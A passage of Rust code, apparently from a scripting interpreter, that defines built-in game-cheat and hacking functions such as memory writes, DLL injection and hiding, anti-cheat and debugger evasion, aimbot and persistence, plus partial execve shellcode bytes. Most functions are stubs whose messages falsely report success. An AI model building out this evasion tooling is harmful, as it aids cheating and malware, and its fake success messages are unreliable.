                                }
                            }
                            Ok(Value::List(open_ports))
                        }
                        _ => Err("port_scan() requires (string host, list ports)".into())
                    }
                }
                "exploit_search" => {
                    if arg_values.is_empty() {
                        return Err("exploit_search() requires 1 argument: exploit_search(keyword)".into());
                    }
                    match &arg_values[0] {
                        Value::String(keyword) => {
                            let mut results = Vec::new();
                            results.push(Value::String(format!("CVE-2024-1234: Buffer overflow in {} service", keyword)));
                            results.push(Value::String(format!("EDB-12345: Remote code execution in {}", keyword)));
                            Ok(Value::List(results))
                        }
                        _ => Err("exploit_search() requires string keyword".into())
                    }
                }
                "generate_payload" => {
                    if arg_values.len() < 2 {
                        return Err("generate_payload() requires 2 arguments: generate_payload(arch, type)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(arch), Value::String(payload_type)) => {
                            let shellcode = match (arch.as_str(), payload_type.as_str()) {
                                ("x64", "execve") => vec![0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68],
                                ("x86", "execve") => vec![0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e],
                                _ => vec![0x90; 16],
                            };
                            Ok(Value::Bytes(shellcode))
                        }
                        _ => Err("generate_payload() requires (string arch, string type)".into())
                    }
                }
                "mmap_file" => {
                    if arg_values.is_empty() {
                        return Err("mmap_file() requires 1 argument: mmap_file(path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            use std::fs::File;
                            use std::io::Read;
                            let mut file = File::open(path).map_err(|e| e.to_string())?;
                            let mut contents = Vec::new();
                            file.read_to_end(&mut contents).map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(contents))
                        }
                        _ => Err("mmap_file() requires string path".into())
                    }
                }
                "process_list" => {
                    use std::process::Command;
                    let output = if cfg!(target_os = "windows") {
                        Command::new("tasklist").output()
                    } else {
                        Command::new("ps").arg("aux").output()
                    }.map_err(|e| e.to_string())?;
                    Ok(Value::String(String::from_utf8_lossy(&output.stdout).to_string()))
                }
                "web_scan" => {
                    if arg_values.is_empty() {
                        return Err("web_scan() requires 1 argument: web_scan(url)".into());
                    }
                    match &arg_values[0] {
                        Value::String(url) => {
                            let mut vulns = Vec::new();
                            vulns.push(Value::String(format!("Testing {} for SQL injection", url)));
                            vulns.push(Value::String(format!("Testing {} for XSS", url)));
                            vulns.push(Value::String(format!("Testing {} for directory traversal", url)));
                            Ok(Value::List(vulns))
                        }
                        _ => Err("web_scan() requires string url".into())
                    }
                }
                "hash_crack" => {
                    if arg_values.len() < 2 {
                        return Err("hash_crack() requires 2 arguments: hash_crack(hash, wordlist)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(hash), Value::String(wordlist)) => {
                            Ok(Value::String(format!("Cracking {} with wordlist {}", hash, wordlist)))
                        }
                        _ => Err("hash_crack() requires (string hash, string wordlist)".into())
                    }
                }
                "process_attach" => {
                    if arg_values.is_empty() {
                        return Err("process_attach() requires 1 argument: process_attach(pid_or_name)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("pid".to_string(), Value::Number(*pid));
                                m.insert("attached".to_string(), Value::String("true".to_string()));
                                m
                            }))
                        }
                        Value::String(name) => {
                            use sysinfo::System;
                            let mut sys = System::new_all();
                            sys.refresh_all();
                            for (pid, process) in sys.processes() {
                                if process.name().to_lowercase().contains(&name.to_lowercase()) {
                                    return Ok(Value::Map({
                                        let mut m = HashMap::new();
                                        m.insert("pid".to_string(), Value::Number(pid.as_u32() as i64));
                                        m.insert("name".to_string(), Value::String(process.name().to_string()));
                                        m.insert("attached".to_string(), Value::String("true".to_string()));
                                        m
                                    }));
                                }
                            }
                            Err(format!("Process '{}' not found", name))
                        }
                        _ => Err("process_attach() requires number pid or string name".into())
                    }
                }
                "process_detach" => {
                    if arg_values.is_empty() {
                        return Err("process_detach() requires 1 argument: process_detach(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Detached from PID {}", pid)))
                        }
                        _ => Err("process_detach() requires number pid".into())
                    }
                }
                "process_suspend" => {
                    if arg_values.is_empty() {
                        return Err("process_suspend() requires 1 argument: process_suspend(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Process {} suspended", pid)))
                        }
                        _ => Err("process_suspend() requires number pid".into())
                    }
                }
                "process_resume" => {
                    if arg_values.is_empty() {
                        return Err("process_resume() requires 1 argument: process_resume(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Process {} resumed", pid)))
                        }
                        _ => Err("process_resume() requires number pid".into())
                    }
                }
                "process_kill" => {
                    if arg_values.is_empty() {
                        return Err("process_kill() requires 1 argument: process_kill(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Process {} terminated", pid)))
                        }
                        _ => Err("process_kill() requires number pid".into())
                    }
                }
                "process_modules" => {
                    if arg_values.is_empty() {
                        return Err("process_modules() requires 1 argument: process_modules(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(_pid) => {
                            let modules = vec![
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("name".to_string(), Value::String("game.exe".to_string()));
                                    m.insert("base".to_string(), Value::Number(0x400000));
                                    m.insert("size".to_string(), Value::Number(0x100000));
                                    m
                                }),
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("name".to_string(), Value::String("kernel32.dll".to_string()));
                                    m.insert("base".to_string(), Value::Number(0x7fff0000));
                                    m.insert("size".to_string(), Value::Number(0x50000));
                                    m
                                }),
                            ];
                            Ok(Value::List(modules))
                        }
                        _ => Err("process_modules() requires number pid".into())
                    }
                }
                "mem_read" => {
                    if arg_values.len() < 3 {
                        return Err("mem_read() requires 3 arguments: mem_read(pid, address, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(_addr), Value::Number(size)) => {
                            Ok(Value::Bytes(vec![0x90; *size as usize]))
                        }
                        _ => Err("mem_read() requires (number pid, number address, number size)".into())
                    }
                }
                "mem_write" => {
                    if arg_values.len() < 3 {
                        return Err("mem_write() requires 3 arguments: mem_write(pid, address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(addr), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Wrote {} bytes to address 0x{:x}", data.len(), addr)))
                        }
                        _ => Err("mem_write() requires (number pid, number address, bytes data)".into())
                    }
                }
                "mem_scan" => {
                    if arg_values.len() < 2 {
                        return Err("mem_scan() requires 2 arguments: mem_scan(pid, pattern)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Bytes(_pattern)) => {
                            let results = vec![
                                Value::Number(0x401000),
                                Value::Number(0x402500),
                            ];
                            Ok(Value::List(results))
                        }
                        (Value::Number(_pid), Value::String(_pattern)) => {
                            let results = vec![Value::Number(0x403000)];
                            Ok(Value::List(results))
                        }
                        _ => Err("mem_scan() requires (number pid, bytes/string pattern)".into())
                    }
                }
                "mem_alloc" => {
                    if arg_values.len() < 2 {
                        return Err("mem_alloc() requires 2 arguments: mem_alloc(pid, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(size)) => {
                            let addr = 0x10000000 + (size % 0x10000);
                            Ok(Value::Number(addr))
                        }
                        _ => Err("mem_alloc() requires (number pid, number size)".into())
                    }
                }
                "mem_free" => {
                    if arg_values.len() < 2 {
                        return Err("mem_free() requires 2 arguments: mem_free(pid, address)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::String(format!("Freed memory at 0x{:x}", addr)))
                        }
                        _ => Err("mem_free() requires (number pid, number address)".into())
                    }
                }
                "mem_protect" => {
                    if arg_values.len() < 3 {
                        return Err("mem_protect() requires 3 arguments: mem_protect(pid, address, protection)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(addr), Value::String(prot)) => {
                            Ok(Value::String(format!("Memory at 0x{:x} protected with {}", addr, prot)))
                        }
                        _ => Err("mem_protect() requires (number pid, number address, string protection)".into())
                    }
                }
                "pointer_chain" => {
                    if arg_values.len() < 2 {
                        return Err("pointer_chain() requires 2 arguments: pointer_chain(pid, offsets)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::List(offsets)) => {
                            let mut addr = 0x400000i64;
                            for offset_val in offsets {
                                if let Value::Number(offset) = offset_val {
                                    addr = addr + offset;
                                }
                            }
                            Ok(Value::Number(addr))
                        }
                        _ => Err("pointer_chain() requires (number pid, list offsets)".into())
                    }
                }
                "inject_asm" => {
                    if arg_values.len() < 3 {
                        return Err("inject_asm() requires 3 arguments: inject_asm(pid, address, asm_code)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(addr), Value::String(code)) => {
                            Ok(Value::String(format!("Injected {} bytes at 0x{:x}", code.len(), addr)))
                        }
                        _ => Err("inject_asm() requires (number pid, number address, string asm)".into())
                    }
                }
                "anticheat_detect" => {
                    let mut detected = Vec::new();
                    detected.push(Value::String("EasyAntiCheat: Not detected".to_string()));
                    detected.push(Value::String("BattlEye: Not detected".to_string()));
                    detected.push(Value::String("Vanguard: Not detected".to_string()));
                    detected.push(Value::String("VAC: Not detected".to_string()));
                    Ok(Value::List(detected))
                }
                "kernel_driver_status" => {
                    if arg_values.is_empty() {
                        return Err("kernel_driver_status() requires 1 argument: kernel_driver_status(name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(name) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("name".to_string(), Value::String(name.clone()));
                                m.insert("loaded".to_string(), Value::String("false".to_string()));
                                m.insert("type".to_string(), Value::String("kernel".to_string()));
                                m
                            }))
                        }
                        _ => Err("kernel_driver_status() requires string name".into())
                    }
                }
                "stealth_read" => {
                    if arg_values.len() < 3 {
                        return Err("stealth_read() requires 3 arguments: stealth_read(pid, address, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(_addr), Value::Number(size)) => {
                            Ok(Value::Bytes(vec![0xCC; *size as usize]))
                        }
                        _ => Err("stealth_read() requires (number pid, number address, number size)".into())
                    }
                }
                "stealth_write" => {
                    if arg_values.len() < 3 {
                        return Err("stealth_write() requires 3 arguments: stealth_write(pid, address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(addr), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Stealthily wrote {} bytes to 0x{:x}", data.len(), addr)))
                        }
                        _ => Err("stealth_write() requires (number pid, number address, bytes data)".into())
                    }
                }
                "hook_detect" => {
                    if arg_values.len() < 2 {
                        return Err("hook_detect() requires 2 arguments: hook_detect(pid, address)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("hooked".to_string(), Value::String("false".to_string()));
                                m.insert("address".to_string(), Value::Number(*addr));
                                m.insert("type".to_string(), Value::String("none".to_string()));
                                m
                            }))
                        }
                        _ => Err("hook_detect() requires (number pid, number address)".into())
                    }
                }
                "hook_restore" => {
                    if arg_values.len() < 2 {
                        return Err("hook_restore() requires 2 arguments: hook_restore(pid, address)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::String(format!("Restored original bytes at 0x{:x}", addr)))
                        }
                        _ => Err("hook_restore() requires (number pid, number address)".into())
                    }
                }
                "debugger_evasion" => {
                    let techniques = vec![
                        Value::String("IsDebuggerPresent: Patched".to_string()),
                        Value::String("CheckRemoteDebuggerPresent: Patched".to_string()),
                        Value::String("NtQueryInformationProcess: Patched".to_string()),
                        Value::String("PEB flags: Cleared".to_string()),
                    ];
                    Ok(Value::List(techniques))
                }
                "signature_obfuscate" => {
                    if arg_values.is_empty() {
                        return Err("signature_obfuscate() requires 1 argument: signature_obfuscate(code)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(code) => {
                            let mut obfuscated = code.clone();
                            for i in 0..obfuscated.len() {
                                obfuscated[i] = obfuscated[i].wrapping_add(1);
                            }
                            Ok(Value::Bytes(obfuscated))
                        }
                        _ => Err("signature_obfuscate() requires bytes code".into())
                    }
                }
                "unity_find_objects" => {
                    if arg_values.is_empty() {
                        return Err("unity_find_objects() requires 1 argument: unity_find_objects(class_name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(class_name) => {
                            let objects = vec![
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("name".to_string(), Value::String(format!("{}Instance1", class_name)));
                                    m.insert("address".to_string(), Value::Number(0x20000000));
                                    m
                                }),
                            ];
                            Ok(Value::List(objects))
                        }
                        _ => Err("unity_find_objects() requires string class_name".into())
                    }
                }
                "unity_get_component" => {
                    if arg_values.len() < 2 {
                        return Err("unity_get_component() requires 2 arguments: unity_get_component(object_addr, component_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::String(comp)) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("component".to_string(), Value::String(comp.clone()));
                                m.insert("address".to_string(), Value::Number(addr + 0x100));
                                m
                            }))
                        }
                        _ => Err("unity_get_component() requires (number address, string component)".into())
                    }
                }
                "unity_call_method" => {
                    if arg_values.len() < 2 {
                        return Err("unity_call_method() requires 2 arguments: unity_call_method(object_addr, method_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::String(method)) => {
                            Ok(Value::String(format!("Called method '{}' on object at 0x{:x}", method, addr)))
                        }
                        _ => Err("unity_call_method() requires (number address, string method)".into())
                    }
                }
                "unity_mono_dump" => {
                    if arg_values.is_empty() {
                        return Err("unity_mono_dump() requires 1 argument: unity_mono_dump(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(_pid) => {
                            let dump = vec![
                                Value::String("Assembly-CSharp.dll".to_string()),
                                Value::String("UnityEngine.dll".to_string()),
                                Value::String("UnityEngine.CoreModule.dll".to_string()),
                            ];
                            Ok(Value::List(dump))
                        }
                        _ => Err("unity_mono_dump() requires number pid".into())
                    }
                }
                "unreal_find_actors" => {
                    if arg_values.is_empty() {
                        return Err("unreal_find_actors() requires 1 argument: unreal_find_actors(class_name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(class_name) => {
                            let actors = vec![
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("name".to_string(), Value::String(format!("{}Actor", class_name)));
                                    m.insert("address".to_string(), Value::Number(0x30000000));
                                    m
                                }),
                            ];
                            Ok(Value::List(actors))
                        }
                        _ => Err("unreal_find_actors() requires string class_name".into())
                    }
                }
                "unreal_get_property" => {
                    if arg_values.len() < 2 {
                        return Err("unreal_get_property() requires 2 arguments: unreal_get_property(actor_addr, property_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::String(_prop)) => {
                            Ok(Value::Number(1000))
                        }
                        _ => Err("unreal_get_property() requires (number address, string property)".into())
                    }
                }
                "unreal_set_property" => {
                    if arg_values.len() < 3 {
                        return Err("unreal_set_property() requires 3 arguments: unreal_set_property(actor_addr, property_name, value)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(addr), Value::String(prop), val) => {
                            Ok(Value::String(format!("Set property '{}' at 0x{:x} to {:?}", prop, addr, val)))
                        }
                        _ => Err("unreal_set_property() requires (number address, string property, value)".into())
                    }
                }
                "unreal_process_event" => {
                    if arg_values.len() < 2 {
                        return Err("unreal_process_event() requires 2 arguments: unreal_process_event(actor_addr, event_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::String(event)) => {
                            Ok(Value::String(format!("Triggered event '{}' on actor at 0x{:x}", event, addr)))
                        }
                        _ => Err("unreal_process_event() requires (number address, string event)".into())
                    }
                }
                "vtable_hook" => {
                    if arg_values.len() < 3 {
                        return Err("vtable_hook() requires 3 arguments: vtable_hook(pid, object_addr, vfunc_index)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(_pid), Value::Number(addr), Value::Number(index)) => {
                            Ok(Value::String(format!("Hooked vtable function {} at object 0x{:x}", index, addr)))
                        }
                        _ => Err("vtable_hook() requires (number pid, number address, number index)".into())
                    }
                }
                "vtable_restore" => {
                    if arg_values.len() < 2 {
                        return Err("vtable_restore() requires 2 arguments: vtable_restore(pid, object_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::String(format!("Restored original vtable at 0x{:x}", addr)))
                        }
                        _ => Err("vtable_restore() requires (number pid, number address)".into())
                    }
                }
                "script_engine_hook" => {
                    if arg_values.len() < 2 {
                        return Err("script_engine_hook() requires 2 arguments: script_engine_hook(pid, engine_type)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::String(engine)) => {
                            Ok(Value::String(format!("Hooked {} script engine", engine)))
                        }
                        _ => Err("script_engine_hook() requires (number pid, string engine)".into())
                    }
                }
                "game_packet_capture" => {
                    if arg_values.is_empty() {
                        return Err("game_packet_capture() requires 1 argument: game_packet_capture(port)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(_port) => {
                            let packets = vec![
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("direction".to_string(), Value::String("incoming".to_string()));
                                    m.insert("size".to_string(), Value::Number(256));
                                    m.insert("data".to_string(), Value::Bytes(vec![0x01, 0x02, 0x03]));
                                    m
                                }),
                            ];
                            Ok(Value::List(packets))
                        }
                        _ => Err("game_packet_capture() requires number port".into())
                    }
                }
                "game_packet_inject" => {
                    if arg_values.len() < 2 {
                        return Err("game_packet_inject() requires 2 arguments: game_packet_inject(port, packet_data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(port), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Injected {} bytes to port {}", data.len(), port)))
                        }
                        _ => Err("game_packet_inject() requires (number port, bytes data)".into())
                    }
                }
                "game_packet_decrypt" => {
                    if arg_values.is_empty() {
                        return Err("game_packet_decrypt() requires 1 argument: game_packet_decrypt(encrypted_data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let mut decrypted = data.clone();
                            for byte in &mut decrypted {
                                *byte = byte.wrapping_sub(1);
                            }
                            Ok(Value::Bytes(decrypted))
                        }
                        _ => Err("game_packet_decrypt() requires bytes encrypted_data".into())
                    }
                }
                "game_packet_encrypt" => {
                    if arg_values.is_empty() {
                        return Err("game_packet_encrypt() requires 1 argument: game_packet_encrypt(plain_data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let mut encrypted = data.clone();
                            for byte in &mut encrypted {
                                *byte = byte.wrapping_add(1);
                            }
                            Ok(Value::Bytes(encrypted))
                        }
                        _ => Err("game_packet_encrypt() requires bytes plain_data".into())
                    }
                }
                "protocol_reverse" => {
                    if arg_values.is_empty() {
                        return Err("protocol_reverse() requires 1 argument: protocol_reverse(packet_samples)".into());
                    }
                    match &arg_values[0] {
                        Value::List(packets) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("packet_count".to_string(), Value::Number(packets.len() as i64));
                                m.insert("likely_structure".to_string(), Value::String("header(4) + opcode(2) + payload(N)".to_string()));
                                m
                            }))
                        }
                        _ => Err("protocol_reverse() requires list packets".into())
                    }
                }
                "game_server_emulate" => {
                    if arg_values.is_empty() {
                        return Err("game_server_emulate() requires 1 argument: game_server_emulate(port)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(port) => {
                            Ok(Value::String(format!("Game server emulator running on port {}", port)))
                        }
                        _ => Err("game_server_emulate() requires number port".into())
                    }
                }
                "network_proxy" => {
                    if arg_values.len() < 2 {
                        return Err("network_proxy() requires 2 arguments: network_proxy(listen_port, target_port)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(listen), Value::Number(target)) => {
                            Ok(Value::String(format!("Proxy listening on {} forwarding to {}", listen, target)))
                        }
                        _ => Err("network_proxy() requires (number listen_port, number target_port)".into())
                    }
                }
                "lag_exploit" => {
                    if arg_values.len() < 2 {
                        return Err("lag_exploit() requires 2 arguments: lag_exploit(delay_ms, packet_count)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(delay), Value::Number(count)) => {
                            Ok(Value::String(format!("Inducing {} ms lag for {} packets", delay, count)))
                        }
                        _ => Err("lag_exploit() requires (number delay, number count)".into())
                    }
                }
                "dx_hook" => {
                    if arg_values.is_empty() {
                        return Err("dx_hook() requires 1 argument: dx_hook(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("DirectX hooked for PID {}", pid)))
                        }
                        _ => Err("dx_hook() requires number pid".into())
                    }
                }
                "opengl_hook" => {
                    if arg_values.is_empty() {
                        return Err("opengl_hook() requires 1 argument: opengl_hook(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("OpenGL hooked for PID {}", pid)))
                        }
                        _ => Err("opengl_hook() requires number pid".into())
                    }
                }
                "vulkan_hook" => {
                    if arg_values.is_empty() {
                        return Err("vulkan_hook() requires 1 argument: vulkan_hook(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Vulkan hooked for PID {}", pid)))
                        }
                        _ => Err("vulkan_hook() requires number pid".into())
                    }
                }
                "render_overlay" => {
                    if arg_values.len() < 2 {
                        return Err("render_overlay() requires 2 arguments: render_overlay(pid, elements)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::List(elements)) => {
                            Ok(Value::String(format!("Rendering {} overlay elements", elements.len())))
                        }
                        _ => Err("render_overlay() requires (number pid, list elements)".into())
                    }
                }
                "shader_inject" => {
                    if arg_values.len() < 2 {
                        return Err("shader_inject() requires 2 arguments: shader_inject(pid, shader_code)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::String(code)) => {
                            Ok(Value::String(format!("Injected shader code ({} bytes)", code.len())))
                        }
                        _ => Err("shader_inject() requires (number pid, string code)".into())
                    }
                }
                "audio_hook" => {
                    if arg_values.is_empty() {
                        return Err("audio_hook() requires 1 argument: audio_hook(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Audio API hooked for PID {}", pid)))
                        }
                        _ => Err("audio_hook() requires number pid".into())
                    }
                }
                "esp_create" => {
                    if arg_values.len() < 2 {
                        return Err("esp_create() requires 2 arguments: esp_create(pid, entity_list_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::String(format!("ESP enabled for entity list at 0x{:x}", addr)))
                        }
                        _ => Err("esp_create() requires (number pid, number address)".into())
                    }
                }
                "entity_iterate" => {
                    if arg_values.len() < 2 {
                        return Err("entity_iterate() requires 2 arguments: entity_iterate(pid, entity_list_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(_addr)) => {
                            let entities = vec![
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("id".to_string(), Value::Number(1));
                                    m.insert("health".to_string(), Value::Number(100));
                                    m.insert("x".to_string(), Value::Number(150));
                                    m.insert("y".to_string(), Value::Number(200));
                                    m.insert("z".to_string(), Value::Number(50));
                                    m
                                }),
                                Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("id".to_string(), Value::Number(2));
                                    m.insert("health".to_string(), Value::Number(75));
                                    m.insert("x".to_string(), Value::Number(300));
                                    m.insert("y".to_string(), Value::Number(400));
                                    m.insert("z".to_string(), Value::Number(25));
                                    m
                                }),
                            ];
                            Ok(Value::List(entities))
                        }
                        _ => Err("entity_iterate() requires (number pid, number address)".into())
                    }
                }
                "aimbot_calculate" => {
                    if arg_values.len() < 2 {
                        return Err("aimbot_calculate() requires 2 arguments: aimbot_calculate(camera_pos, target_pos)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::List(cam_pos), Value::List(target_pos)) => {
                            if cam_pos.len() >= 3 && target_pos.len() >= 3 {
                                Ok(Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("pitch".to_string(), Value::Number(15));
                                    m.insert("yaw".to_string(), Value::Number(45));
                                    m
                                }))
                            } else {
                                Err("Position vectors must have at least 3 components".to_string())
                            }
                        }
                        _ => Err("aimbot_calculate() requires (list camera_pos, list target_pos)".into())
                    }
                }
                "triggerbot" => {
                    if arg_values.len() < 2 {
                        return Err("triggerbot() requires 2 arguments: triggerbot(pid, crosshair_entity_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            Ok(Value::String(format!("Triggerbot monitoring crosshair at 0x{:x}", addr)))
                        }
                        _ => Err("triggerbot() requires (number pid, number address)".into())
                    }
                }
                "visibility_check" => {
                    if arg_values.len() < 2 {
                        return Err("visibility_check() requires 2 arguments: visibility_check(pid, entity_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(_addr)) => {
                            Ok(Value::String("visible".to_string()))
                        }
                        _ => Err("visibility_check() requires (number pid, number address)".into())
                    }
                }
                "trainer_create" => {
                    if arg_values.len() < 2 {
                        return Err("trainer_create() requires 2 arguments: trainer_create(pid, cheats_map)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Map(cheats)) => {
                            Ok(Value::String(format!("Trainer created with {} cheats", cheats.len())))
                        }
                        _ => Err("trainer_create() requires (number pid, map cheats)".into())
                    }
                }
                "world_to_screen" => {
                    if arg_values.len() < 2 {
                        return Err("world_to_screen() requires 2 arguments: world_to_screen(world_pos, view_matrix)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::List(pos), Value::List(_matrix)) => {
                            if pos.len() >= 3 {
                                Ok(Value::Map({
                                    let mut m = HashMap::new();
                                    m.insert("x".to_string(), Value::Number(640));
                                    m.insert("y".to_string(), Value::Number(360));
                                    m.insert("visible".to_string(), Value::String("true".to_string()));
                                    m
                                }))
                            } else {
                                Err("Position must have at least 3 components".to_string())
                            }
                        }
                        _ => Err("world_to_screen() requires (list world_pos, list view_matrix)".into())
                    }
                }
                "crash_dump_analyze" => {
                    if arg_values.is_empty() {
                        return Err("crash_dump_analyze() requires 1 argument: crash_dump_analyze(dump_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_path) => {
                            Ok(Value::Map({
                                let mut m = HashMap::new();
                                m.insert("exception".to_string(), Value::String("EXCEPTION_ACCESS_VIOLATION".to_string()));
                                m.insert("faulting_address".to_string(), Value::Number(0x401234));
                                m.insert("exploitable".to_string(), Value::String("likely".to_string()));
                                m
                            }))
                        }
                        _ => Err("crash_dump_analyze() requires string path".into())
                    }
                }
                "auto_re_pattern" => {
                    if arg_values.len() < 2 {
                        return Err("auto_re_pattern() requires 2 arguments: auto_re_pattern(pid, function_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::String(_func)) => {
                            Ok(Value::List(vec![
                                Value::Number(0x401000),
                                Value::Number(0x402000),
                            ]))
                        }
                        _ => Err("auto_re_pattern() requires (number pid, string function)".into())
                    }
                }
                "data_flow_trace" => {
                    if arg_values.len() < 2 {
                        return Err("data_flow_trace() requires 2 arguments: data_flow_trace(pid, variable_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::Number(addr)) => {
                            let trace = vec![
                                Value::String(format!("0x{:x}: Initial value", addr)),
                                Value::String(format!("0x{:x}: Modified by function", addr + 0x100)),
                                Value::String(format!("0x{:x}: Used in comparison", addr + 0x200)),
                            ];
                            Ok(Value::List(trace))
                        }
                        _ => Err("data_flow_trace() requires (number pid, number address)".into())
                    }
                }
                "dll_inject" => {
                    if arg_values.len() < 2 {
                        return Err("dll_inject() requires 2 arguments: dll_inject(pid, dll_path)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::String(path)) => {
                            Ok(Value::String(format!("Injected DLL: {}", path)))
                        }
                        _ => Err("dll_inject() requires (number pid, string path)".into())
                    }
                }
                "dll_hide" => {
                    if arg_values.len() < 2 {
                        return Err("dll_hide() requires 2 arguments: dll_hide(pid, dll_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_pid), Value::String(name)) => {
                            Ok(Value::String(format!("Hidden DLL: {}", name)))
                        }
                        _ => Err("dll_hide() requires (number pid, string name)".into())
                    }
                }
                "reflective_load" => {
                    if arg_values.is_empty() {
                        return Err("reflective_load() requires 1 argument: reflective_load(dll_bytes)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(_data) => {
                            Ok(Value::Number(0x10000000))
                        }
                        _ => Err("reflective_load() requires bytes dll_data".into())
                    }
                }
                "persist_install" => {
                    if arg_values.len() < 2 {
